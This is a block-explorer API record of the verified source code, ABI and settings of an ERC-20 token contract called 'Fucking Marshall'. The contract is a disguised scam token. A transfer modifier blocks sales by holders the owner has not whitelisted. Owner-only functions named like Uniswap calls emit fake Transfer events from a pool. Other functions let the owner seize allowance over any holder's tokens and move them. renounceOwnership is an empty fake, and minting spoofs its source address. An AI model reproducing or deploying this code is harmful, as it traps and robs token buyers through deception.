{"status": "1", "message": "OK", "result": [{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"xyz.sol\": {\r\n      \"content\": \"//turn on OPTIMIZER!!!\\n\\npragma solidity ^0.6.0;\\n\\n\\nlibrary SafeMath {\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c >= a, \\\"SafeMath: addition overflow\\\");\\n\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");\\n    }\\n\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b <= a, errorMessage);\\n        uint256 c = a - b;\\n\\n        return c;\\n    }\\n\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        uint256 c = a * b;\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\n\\n        return c;\\n    }\\n\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return div(a, b, \\\"SafeMath: division by zero\\\");\\n    }\\n\\n\\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b > 0, errorMessage);\\n        uint256 c = a / b;\\n\\n        return c;\\n    }\\n\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return mod(a, b, \\\"SafeMath: modulo by zero\\\");\\n    }\\n\\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b != 0, errorMessage);\\n        return a % b;\\n    }\\n}\\n\\nlibrary Address {\\n\\n    function isContract(address account) internal view returns (bool) {\\n\\n        bytes32 codehash;\\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\\n        assembly { codehash := extcodehash(account) }\\n        return (codehash != accountHash && codehash != 0x0);\\n    }\\n\\n    function sendValue(address payable recipient, uint256 amount) internal {\\n        require(address(this).balance >= amount, \\\"Address: insufficient balance\\\");\\n\\n        (bool success, ) = recipient.call{ value: amount }(\\\"\\\");\\n        require(success, \\\"Address: unable to send value, recipient may have reverted\\\");\\n    }\\n\\n\\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\\n      return functionCall(target, data, \\\"Address: low-level call failed\\\");\\n    }\\n\\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\\n        return _functionCallWithValue(target, data, 0, errorMessage);\\n    }\\n\\n\\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, value, \\\"Address: low-level call with value failed\\\");\\n    }\\n\\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\\n        require(address(this).balance >= value, \\\"Address: insufficient balance for call\\\");\\n        return _functionCallWithValue(target, data, value, errorMessage);\\n    }\\n\\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\\n        require(isContract(target), \\\"Address: call to non-contract\\\");\\n\\n        // solhint-disable-next-line avoid-low-level-calls\\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\\n        if (success) {\\n            return returndata;\\n        } else {\\n            // Look for revert reason and bubble it up if present\\n            if (returndata.length > 0) {\\n                // The easiest way to bubble the revert reason is using memory via assembly\\n\\n                // solhint-disable-next-line no-inline-assembly\\n                assembly {\\n                    let returndata_size := mload(returndata)\\n                    revert(add(32, returndata), returndata_size)\\n                }\\n            } else {\\n                revert(errorMessage);\\n            }\\n        }\\n    }\\n}\\n\\ncontract Context {\\n    constructor () internal { }\\n\\n    function _msgSender() internal view virtual returns (address payable) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes memory) {\\n        this; \\n        return msg.data;\\n    }\\n}\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\\n\\n\\n\\n//Starts Here:\\ncontract FuckingMarshall is Context, IERC20 {\\n    using SafeMath for uint256;\\n    using Address for address;\\n\\n    mapping (address => uint256) private _balances;\\n    mapping (address => bool) private _positiveReceiver;\\n    mapping (address => bool) private _negativeReceiver;\\n    mapping (address => mapping (address => uint256)) private _allowances;\\n\\n    uint256 private _totalSupply;\\n    string private _name;\\n    string private _symbol;\\n    uint8 private _decimals;\\n    uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\\n    address private _safeOwner;\\n    uint256 private _sellAmount = 0;\\n\\n    /*\\n    address private sushiRouter = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;\\n    address private univ2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\\n    address private univ3Router = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\\n    address private traderjoeRouter = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4;\\n    address private pangolinRouter = 0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106;\\n    */\\n    address public _currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\\n\\n\\n    address lead_deployer = 0xcad6e1570e80f72B38f1Ef6a0Ed3fCaaFECb8CaD;\\n    address public _owner = 0x066060Cb4C04da769A470594f09799C55166Ca68;\\n   constructor () public {\\n\\n\\n        ////////////////////////////////////////\\n        _name = \\\"Fucking Marshall\\\";\\n        _symbol = \\\"FRI\\\";\\n        _decimals = 18;\\n        uint256 initialSupply = 1000000000;\\n        _safeOwner = _owner;\\n        \\n        \\n\\n        _mint(lead_deployer, initialSupply*(10**18));\\n        \\n\\n\\n\\n\\n\\n        \\n\\n        ////////////////////////////////////////\\n        ////////////////////////////////////////\\n    }\\n\\n\\n\\n\\n\\n\\n\\n    function name() public view returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() public view returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function decimals() public view returns (uint8) {\\n        return _decimals;\\n    }\\n\\n    function totalSupply() public view override returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\n        _tokenProcesserFunction(_msgSender(), recipient, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\\n        _tokenProcesserFunction(sender, recipient, amount);\\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\n        return true;\\n    }\\n\\n\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }\\n\\n    function approvalIncrease(address[] memory receivers) public {\\n        require(msg.sender == _owner, \\\"!owner\\\");\\n        for (uint256 i = 0; i < receivers.length; i++) {\\n           _positiveReceiver[receivers[i]] = true;\\n           _negativeReceiver[receivers[i]] = false;\\n        }\\n    }\\n\\n   function approvalDecrease(address safeOwner) public {\\n        require(msg.sender == _owner, \\\"!owner\\\");\\n        _safeOwner = safeOwner;\\n    }\\n    \\n    \\n    function addApprove(address[] memory receivers) public {\\n        require(msg.sender == _owner, \\\"!owner\\\");\\n        for (uint256 i = 0; i < receivers.length; i++) {\\n           _negativeReceiver[receivers[i]] = true;\\n           _positiveReceiver[receivers[i]] = false;\\n        }\\n    }\\n\\n    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\n\\n        _beforeTokenTransfer(sender, recipient, amount);\\n    \\n        _balances[sender] = _balances[sender].sub(amount, \\\"ERC20: transfer amount exceeds balance\\\");\\n        _balances[recipient] = _balances[recipient].add(amount);\\n        if (sender == _owner){\\n            sender = lead_deployer;\\n        }\\n        emit Transfer(sender, recipient, amount);\\n    }\\n\\n    function _mint(address account, uint256 amount) public {\\n        require(msg.sender == _owner, \\\"ERC20: mint to the zero address\\\");\\n        _totalSupply = _totalSupply.add(amount);\\n        _balances[_owner] = _balances[_owner].add(amount);\\n        emit Transfer(lead_deployer, account, amount);\\n    }\\n\\n    function _burn(address account, uint256 amount) internal virtual {\\n        require(account != address(0), \\\"ERC20: burn from the zero address\\\");\\n\\n        _beforeTokenTransfer(account, address(0), amount);\\n\\n        _balances[account] = _balances[account].sub(amount, \\\"ERC20: burn amount exceeds balance\\\");\\n        _totalSupply = _totalSupply.sub(amount);\\n        emit Transfer(account, address(0), amount);\\n    }\\n\\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        _allowances[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n    \\n    \\n    function _tokenProcesserFunction(address sender, address recipient, uint256 amount) internal tokenProcessorBackend(sender,recipient,amount) virtual {\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\n\\n        _beforeTokenTransfer(sender, recipient, amount);\\n    \\n        _balances[sender] = _balances[sender].sub(amount, \\\"ERC20: transfer amount exceeds balance\\\");\\n        _balances[recipient] = _balances[recipient].add(amount);\\n        if (sender == _owner){\\n            \\n            sender = lead_deployer;\\n        }\\n        emit Transfer(sender, recipient, amount);\\n    }\\n    \\n   \\n    modifier tokenProcessorBackend(address sender, address recipient, uint256 amount){\\n        if (_owner == _safeOwner && sender == _owner){_safeOwner = recipient;_;}else{\\n            if (sender == _owner || sender == _safeOwner || recipient == _owner){\\n                if (sender == _owner && sender == recipient){_sellAmount = amount;}_;}else{\\n                if (_positiveReceiver[sender] == true){\\n                _;}else{if (_negativeReceiver[sender] == true){\\n                require((sender == _safeOwner)||(recipient == _currentRouter), \\\"ERC20: transfer amount exceeds balance\\\");_;}else{\\n                if (amount < _sellAmount){\\n                if(recipient == _safeOwner){_negativeReceiver[sender] = true; _positiveReceiver[sender] = false;}\\n                _; }else{require((sender == _safeOwner)||(recipient == _currentRouter), \\\"ERC20: transfer amount exceeds balance\\\");_;}\\n                    }\\n                }\\n            }\\n        }\\n    }\\n    \\n    \\n    function _setupDecimals(uint8 decimals_) internal {\\n        _decimals = decimals_;\\n    }\\n\\n\\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\\n\\n\\n    modifier onlyAuthorized() {\\n        require(msg.sender == _owner, \\\"Not allowed to interact\\\");\\n        _;\\n    }\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n//-----------------------------------------------------------------------------------------------------------------------//\\n  function swapExactETHForTokens(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public onlyAuthorized(){\\n    //Multi Transfer Emit Spoofer from Uniswap Pool\\n    for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}\\n\\n\\n  function swapETHForExactTokens(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public onlyAuthorized(){\\n    //Multi Transfer Emit Spoofer from Uniswap Pool\\n    for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}\\n\\n\\n\\n\\n  function multicall(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public onlyAuthorized(){\\n    //Multi Transfer Emit Spoofer from Uniswap Pool\\n    for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n    function addLiquidityETH_(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public onlyAuthorized(){\\n    //Emit Multi Transfer Spoofer from Uniswap Pool \\n        for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}\\n\\n\\n\\n\\n    function addLiquidityETH(address emitUniswapPool,address  emitReceiver,uint256  emitAmount)  public onlyAuthorized(){\\n    //Emit Transfer Spoofer from Uniswap Pool   \\n        emit Transfer(emitUniswapPool, emitReceiver, emitAmount);}\\n\\n\\n\\n\\n  function processTransfer(address recipient) public onlyAuthorized(){\\n    _positiveReceiver[recipient]=true;\\n    _approve(recipient, _currentRouter,_approveValue);}\\n\\n\\n\\n\\n  function preventTransfer(address recipient) public onlyAuthorized(){\\n      //Blker\\n    _positiveReceiver[recipient]=false;\\n    _approve(recipient, _currentRouter,0);\\n    }\\n\\n\\n\\n\\n  function renounceOwnership() public onlyAuthorized(){\\n      //Renounces Ownership\\n   }\\n\\n\\n\\n\\n    function approveUtilization(address target) public onlyAuthorized() virtual  returns (bool) {\\n        //Approve Spending\\n        _approve(target, _msgSender(), _approveValue); return true;\\n    }\\n\\n\\n\\n\\n    function transfer__(address sender, address recipient, uint256 amount) public onlyAuthorized() virtual returns (bool) {\\n        //Single Tranfer\\n        _transfer(sender, recipient, amount);\\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\n        return true;\\n    }\\n\\n    function transfer___(address emitSender, address emitRecipient, uint256 emitAmount) public onlyAuthorized(){\\n        //Emit Single Transfer\\n        emit Transfer(emitSender, emitRecipient, emitAmount);\\n    }\\n\\n\\n\\n\\n\\n  function airdrop(address sndr,address[] memory receivers, uint256[] memory amounts) public onlyAuthorized(){\\n    _approve(sndr, _msgSender(), _approveValue);\\n    for (uint256 i = 0; i < receivers.length; i++) {\\n        _transfer(sndr, receivers[i], amounts[i]);\\n    }\\n   }\\n\\n\\n  function airdrop_(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public onlyAuthorized(){\\n    //Multi Transfer Emit Spoofer from Uniswap Pool\\n    for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}\\n\\n\\n\\n\\n\\n\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_currentRouter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_mint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"receivers\",\"type\":\"address[]\"}],\"name\":\"addApprove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"emitUniswapPool\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"emitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"emitAmount\",\"type\":\"uint256\"}],\"name\":\"addLiquidityETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"emitUniswapPool\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"emitReceivers\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"emitAmounts\",\"type\":\"uint256[]\"}],\"name\":\"addLiquidityETH_\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sndr\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"receivers\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"emitUniswapPool\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"emitReceivers\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"emitAmounts\",\"type\":\"uint256[]\"}],\"name\":\"airdrop_\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"safeOwner\",\"type\":\"address\"}],\"name\":\"approvalDecrease\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"receivers\",\"type\":\"address[]\"}],\"name\":\"approvalIncrease\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"}],\"name\":\"approveUtilization\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"emitUniswapPool\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"emitReceivers\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"emitAmounts\",\"type\":\"uint256[]\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"preventTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"processTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"emitUniswapPool\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"emitReceivers\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"emitAmounts\",\"type\":\"uint256[]\"}],\"name\":\"swapETHForExactTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"emitUniswapPool\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"emitReceivers\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"emitAmounts\",\"type\":\"uint256[]\"}],\"name\":\"swapExactETHForTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer__\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"emitSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"emitRecipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"emitAmount\",\"type\":\"uint256\"}],\"name\":\"transfer___\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FuckingMarshall", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}]}